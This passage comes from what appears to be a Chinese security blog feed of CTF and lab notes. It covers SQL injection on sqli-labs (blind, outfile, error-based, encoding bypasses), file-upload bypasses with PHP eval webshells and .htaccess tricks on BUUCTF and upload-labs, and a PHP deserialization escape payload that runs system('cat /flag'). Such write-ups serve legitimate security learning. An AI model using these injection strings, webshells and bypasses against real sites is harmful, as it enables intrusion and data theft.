<h4 id="5-猜字段"><a href="#5-猜字段" class="headerlink" title="5.猜字段"></a>5.猜字段</h4><p><strong>有几个字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and (select count(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;)=8--+</span><br><span class="line">正确则该表中字段的数量为8</span><br></pre></td></tr></table></figure>

<p><strong>字段的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜第一个字段的长度</span><br><span class="line">id=  and length(substr((select column_name from information_schema.columns where table_name= &#x27;表名&#x27; limit 0,1),1))=7--+</span><br><span class="line">正确则该字段的长度为7</span><br></pre></td></tr></table></figure>

<p><strong>字段的名字</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select column_name from information_schema.columns where table_name=表名 limit i,1),n,1)=&#x27;&#x27;--+</span><br><span class="line">i是第几个表</span><br><span class="line">n是第几个字符</span><br></pre></td></tr></table></figure>

<h4 id="6-猜数据"><a href="#6-猜数据" class="headerlink" title="6.猜数据"></a>6.猜数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select 列名 from 库名.表名 limit 0,1),1,1)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="7-猜数据库的名字、表的名字、字段的名字和数据都可以使用ascii-substr"><a href="#7-猜数据库的名字、表的名字、字段的名字和数据都可以使用ascii-substr" class="headerlink" title="7.猜数据库的名字、表的名字、字段的名字和数据都可以使用ascii(substr())"></a>7.猜数据库的名字、表的名字、字段的名字和数据都可以使用ascii(substr())</h4><h2 id="三-文件上传"><a href="#三-文件上传" class="headerlink" title="三.文件上传"></a>三.文件上传</h2><h4 id="1-使用select-…-into-outfile函数"><a href="#1-使用select-…-into-outfile函数" class="headerlink" title="1.使用select … into outfile函数"></a>1.使用select … into outfile函数</h4><h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),database() into outfile &quot;d:\\less7\\database.txt&quot;--+</span><br><span class="line">将数据库名存在database.txt中</span><br></pre></td></tr></table></figure>

<h4 id="3-爆表名"><a href="#3-爆表名" class="headerlink" title="3.爆表名"></a>3.爆表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;d:\\less7\\tables.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h4 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;d:\\less7\\columns.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h4 id="5-爆字段内容"><a href="#5-爆字段内容" class="headerlink" title="5.爆字段内容"></a>5.爆字段内容</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),group_concat(username,password) from users into outfile &quot;E:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\user.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h2 id="四-延时注入-使用脚本"><a href="#四-延时注入-使用脚本" class="headerlink" title="四.延时注入(使用脚本)"></a>四.延时注入(使用脚本)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用if(expr1,expr2,expr3)</span><br><span class="line">如果expr1为真就执行expr2,否则执行expr3</span><br><span class="line">sleep()参数写数字，用于将时间延迟</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,sleep(2),1)//如果expr1为真则延迟2秒，为假直接输出1</span><br></pre></td></tr></table></figure>

<p><strong>python</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">datetime.datetime.now()是当前默认的时间</span><br><span class="line">time.time()是返回当前时间的时间戳（以秒表示的浮点数）</span><br></pre></td></tr></table></figure>

<h2 id="五-报错型注入"><a href="#五-报错型注入" class="headerlink" title="五.报错型注入"></a>五.报错型注入</h2><p>在post中使用什么语句都不报错，那就使用报错语句来测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue (XML_document, XPath_string);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">返回内容：若xpath正确则返回目标XML查询的结果，否则返回xpath错误内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line">返回内容：若xpath正确则返回更改对象名称，否则返回xpath错误内容</span><br></pre></td></tr></table></figure>

<p><strong>1.数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,(select database())))#</span><br></pre></td></tr></table></figure>

<p><strong>2.获取表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<p><strong>3.获取字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select column_name from information_schema.columns where table_name=database() limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<p><strong>4.获取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select 列名 from 表名 limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<h2 id="六-请求头注入"><a href="#六-请求头注入" class="headerlink" title="六.请求头注入"></a>六.请求头注入</h2><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>1.User-Agent：简称UA，向访问网站提供所使用的浏览器类型、操作系统、版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识</p>
<p>2.Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</p>
<p>3.Cookie：设置cookie,这是最重要的请求头信息之一</p>
<h2 id="七-绕过"><a href="#七-绕过" class="headerlink" title="七.绕过"></a>七.绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.注释符号被过滤：使用or &#x27;a&#x27;=&#x27;b的方式来绕过</span><br><span class="line">2.空格被过滤：使用%a0空格，%a0换行，%09tab键，%0c来绕过</span><br><span class="line">3.and和or被绕过：用&amp;&amp;和||来代替</span><br><span class="line">4.union和select被绕过：使用sElect，uniOn等来代替</span><br><span class="line">5.可以使用;%00使语句结束</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.gbk(一个汉字用两个字节表示)双字节绕过:</span><br><span class="line">(可以在使用hackbar在get中使用)会在&#x27;后会自己添加\使语句变成\&#x27;的注入语句中，使用%df&#x27;，经过php处理后变成%df\&#x27;，%df\经过编码变成%df%5c连接变为一个汉字，这样就可以单引号逃逸</span><br><span class="line">(相同的方法无法用hackbar在post中使用)使用hackbar，会自动将%df的%换成%25，变为%25df，post无法将其再次解码为%，需要使用burp来注入</span><br></pre></td></tr></table></figure>

<h2 id="八-堆叠注入"><a href="#八-堆叠注入" class="headerlink" title="八.堆叠注入"></a>八.堆叠注入</h2><p>1.原理:在SQL中使用;来使条sql语句结束，我们可以在一条sql语句结束后再构造一个sql语句，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br><span class="line">在用一行输入，可以返回这两个语句的查询</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buu的upload</title>
    <url>/2022/12/03/upload%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[ACTF2020 新生赛]Upload	[GXYCTF2019]BabyUpload	[MRCTF2020]你传你🐎呢	[极客大挑战 2019]Upload</p>
<span id="more"></span>

<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>1.只允许上传图片</p>
<p>2.上传含有木马的.jpg文件然后使用burp抓包</p>
<p>3.将.jpg修改为.php，放包然后无法访问</p>
<p>4.再将.jpg修改为.phtml，然后放包可以用蚁剑连接(.phtml是 <strong>PHP 2 程序</strong>的标准文件扩展名)</p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>1.上传php后缀的文件，显示<strong>后缀名不能有ph！</strong>，这是对后缀名的限制</p>
<p>2.上传其他类型的文件显示<strong>上传类型也太露骨了吧！</strong>，这是对<code>Content-Type</code>的限制，修改为<code>image/jpeg</code>即可绕过</p>
<p>3.上传php木马显示<strong>诶，别蒙我啊，这标志明显还是php啊</strong>，这是对文件的内容做了检测，不能含有&lt;?，只要php版本&lt;7，可以使用<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;mochu7&#39;]);&lt;/script&gt;</code>绕过</p>
<p>4.对于文件后缀限制这个上传.htaccess，但会显示<strong>上传类型也太露骨了吧！</strong>，修改<code>Content-Type</code>，顺利上传</p>
<p>5.然后直接上传有木马的jpg文件，最后用蚁剑连接</p>
<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>和[GXYCTF2019]BabyUpload一样</p>
<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>1.上传内容为<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>的php文件显示**Not image!**，那就修改Content-Type处为image&#x2F;jpeg</p>
<p>2.修改以后继续上传回显NOT!php!意思应该是不能上传后缀为php文件，那就使用.phtml来代替.php</p>
<p>3.上传.phtml文件后显示不能包含&lt;?，所以使用<code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
<p>4.修改了Content-Type，又使用了phtml，又跳过了&lt;?的过滤，上传文件后又显示了<code>内容不全是图片</code>,使用图片头文件欺骗为<code>GIF89a</code>,使用<code>GIF89a</code></p>
<p><code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
<p>5.发现上传成功，使用hackbar在post处使用a&#x3D;system(‘cat &#x2F;flag’);获得flag</p>
]]></content>
  </entry>
  <entry>
    <title>upload-labs关卡</title>
    <url>/2022/11/19/upload-labs/</url>
    <content><![CDATA[<p>简介</p>
<span id="more"></span>

<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>js绕过<br>只允许上传.jpg|.png|.gif后缀的文件<br>那就上传.gif的文件<br>使用burp抓包<br>在burp里修改后缀.gif为.php然后执行</p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>mime头检测(会自动检测文件类型)<br>上传.php后缀的文件<br>使用burp抓包里面的Content-Type是来标识该文件是个什么类型的文件（php还是jpg或者gif等等)<br>将Content-Type后改为image&#x2F;jpeg让代码以为上传的php文件是可以通过的文件<br>然后放包</p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>源代码$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);这个意思是.asp .aspx .php .jsp的文件都不能上传，如果检测到就进行拦截。<br>使用不常见的后缀，比如.php3 .php2等等</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>源代码$deny_ext &#x3D; array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”)<br>这条语句几乎将不常用的后缀都已经拦截<br>所以上传.htaccess文件，让他把任何文件都当做”.php”去读取，这就是.htaccess的功能<br>写入.htacess文件一下内容<br>&lt;FilesMatch “jpg”&gt;&#x2F;&#x2F;为指定上传的文件后缀起作用<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错<br><br>然后再上传一个jpg后缀的文件就可以了</p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>方法一(?)<br>除了拦截的后缀的第四关一样又拦截了.htaccess<br>但源代码里没有循环，这些语句只会执行一次<br>在burp里进行修改为xx.php. .再放包<br>只要保证有两个分开的点就行了演示过程中是最简的方法，两个点放在一起会被防护规则同时删除掉<br>由于Windows系统的命名规则，无论你后缀有多少个空格和点他都会给你自动删除掉<br>方法二<br>源代码里没有了转换为小写<br>上传.php文件后<br>再burp中改为.phP<br>直接放包</p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关(?)"></a>第六关(?)</h3><p>源代码里没有了首尾去空，可以上传.php文件然后用burp抓包<br>在burp中在.php后加一个空格然后再放包</p>
<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>源代码里没有了删除文件名末尾的点<br>上传.php文件后<br>再burp中改为.php.<br>直接放包</p>
<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>源代码中没有了去除字符串::$DATA<br>上传.php文件后<br>再burp中改为.php::$DATA<br>直接放包</p>
<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.php. .<br>最后放包</p>
<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.pphphp<br>最后放包</p>
<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关(?)"></a>第十一关(?)</h3><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关(?)"></a>第十二关(?)</h3><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>将一个.php文件个一个.jpg文件和成一个.jpg文件<br>在cmd中使用copy &#x2F;b xx.jpg+xx.php&#x3D;xx.jpg<br>使用burp抓包<br>进行发送</p>
<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关(?)"></a>第十六关(?)</h3><p>二次渲染</p>
<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>条件竞争<br>上传.php文件<br>进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>图片型的条件竞争<br>上传.jpg文件进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>该题在网页上不仅可以上传文件还可以修改文件名称<br>上传.php文件<br>然后在网页上将文件名修改为.PHP然后进行上传<br>直接访问网页</p>
<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
  </entry>
  <entry>
    <title>反序列化逃逸</title>
    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>字符减少型</p>
<span id="more"></span>

<p>源码是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>

<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>object_sleep</code>会把<code>a*a</code>换为<code>@0@0@0@0@</code>，而<code>object_weakup</code>会把<code>@0@0@0@0@</code>换为<code>a*a</code>如果传入的有<code>a*a</code>，那么经过这两个函数的作用会相互抵消，就没有任何作用，但如果传入的是<code>@0@0@0@0@</code>，<code>object_sleep</code>函数就不会起作用，而是<code>object_sleep</code>会起作用，会使字符串减少，这就可以使用反序列化的字符串逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $f;</span><br><span class="line">    public $hint;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        eval($this-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">$user = serialize(new UserAccount($username, $password));</span><br></pre></td></tr></table></figure>

<p>但是我们可以利用的是username和password，需要靠<code>eval($this-&gt;f);</code>来获得flag，没办法直接给order类的f属性传参，这就需要靠字符串逃逸了</p>
<p>先讲一下字符串减少的逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="string">&#x27;@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&#x27;</span>, <span class="string">&#x27;111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="number">0</span>@<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">s:<span class="number">160</span>:<span class="string">&quot;O:11:&quot;</span>UserAccount<span class="string">&quot;:2:&#123;s:11:&quot;</span> * username<span class="string">&quot;;s:45:&quot;</span>a*aa*aa*aa*aa*a<span class="string">&quot;;s:11:&quot;</span> * password<span class="string">&quot;;s:38:&quot;</span><span class="number">111</span><span class="string">&quot;;s:11:%00*%00password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;<span class="string">&quot;;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>本来给username赋值的是<code>@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@</code>，给password赋值的是<code>111&quot;;s:11:%00*%00password&quot;;s:3:&quot;123&quot;;&#125;</code>，但经过字符串减少的函数后username的值就变成了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:38:&quot;111</code>，password的值就成了123，而这个123就相当于逃逸出来，我们可以自己控制，只需要改变<code>s:3:&quot;123&quot;;</code>这里</p>
<p>所以这个题就可以让后面逃逸出来给f属性进行传参，需要的f值是<code>system(&quot;cat /flag&quot;);</code>，需要让password的值传为<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>，这样就可以给order类中的f属性进行赋值，但是如果直接给password传这个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new UserAccount(&#x27;123&#x27;, &#x27;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>那么序列化之后只会把这个值当作一个字符串看待，不会把它当作一个类，需要将这个值单独逃逸出来</p>
<p>最终的payload可以是这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>这样进行字符串减少后就成了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;UserAccount&quot;:2:&#123;s:11:&quot; * username&quot;;s:45:&quot;a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>就相当于给username赋值了<code>a*aa*aa*aa*aa*a&quot;;s:11:&quot; * password&quot;;s:93:&quot;123</code>，给password赋值了一个类，而不是一个字符串，<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</code>被当作类来处理从而给f属性进行赋值，最后利用<code>eval</code>来得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>buu的反序列化</title>
    <url>/2022/12/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
